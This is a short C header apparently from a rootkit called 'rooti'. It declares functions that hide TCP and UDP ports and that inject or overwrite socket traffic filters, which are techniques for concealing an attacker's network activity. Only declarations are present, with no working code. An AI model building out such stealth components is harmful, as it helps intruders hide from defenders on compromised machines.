#ifndef _ROOTI_HIDING_NET_H
#define _ROOTI_HIDING_NET_H

bool rooti_should_hide_tcp_port(unsigned short port);
bool rooti_should_hide_udp_port(unsigned short port);

int rooti_inject_traffic_filter(struct sock *sock, struct sock_fprog *user_fprog);
int rooti_overwrite_traffic_filter(struct sock *sock);

#endif